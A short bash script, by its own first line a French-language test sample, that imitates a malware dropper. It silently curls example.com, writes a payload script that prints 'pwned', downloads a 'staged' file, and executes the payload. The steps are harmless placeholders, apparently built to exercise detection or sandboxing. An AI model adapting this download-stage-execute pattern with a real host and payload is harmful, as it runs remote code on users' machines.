#!/bin/bash
echo "Hello, je suis un sample de test"
touch /tmp/evil.txt
curl http://example.com >/dev/null 2>&1
echo "echo pwned" > /tmp/payload.sh
chmod +x /tmp/payload.sh

# Fake download
curl http://example.com -o /tmp/stage.bin >/dev/null 2>&1

# Execute staged payload
bash /tmp/payload.sh
sleep 2